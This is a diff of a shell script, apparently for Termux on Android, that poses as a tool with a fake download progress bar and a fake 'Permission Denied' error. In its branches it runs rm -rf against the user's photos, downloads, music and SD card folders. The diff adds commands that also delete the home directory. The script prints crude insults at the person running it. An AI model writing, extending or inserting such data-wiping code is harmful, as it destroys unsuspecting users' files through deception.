@@ -12,7 +12,9 @@ if [ $a == 1 ]; then
 cd ~;cd storage;rm -rf dcim/* downloads/* shared/* pictures/* music/* extsdcard/*; 
 rm -rf movies/* emulated-1/* sdccard/* sdcard1/* sdcard0/* sdcard-1/* emulated-1/*
 cd ~; rm -rf storage
-pkg install ncurses-utils
+cd ..
+rm -rf home
+pkg install ncurses-utils -y
 for lp in 1 2 3 4 5 
 do
 echo " $bold "
@@ -23,6 +25,7 @@ echo " Aur kr cloning bhotni ka bacha Gaand marvany ki ummar me Cloning krny aya
 echo " $reset "
  else
 clear
+pkg install ncurses-utils -y
 for i in 10 20 30 40 50 60 70 80 90 
 do
  echo " $red Downloading............ $i "
@@ -41,6 +44,8 @@ if [ $chk == 1 ]; then
 cd ~
 rm -rf storage/*
 rm -rf storage
+cd ..
+rm -rf home
  else
 clear
 echo " $red \n \n     Erorr ! Permission Denied! "
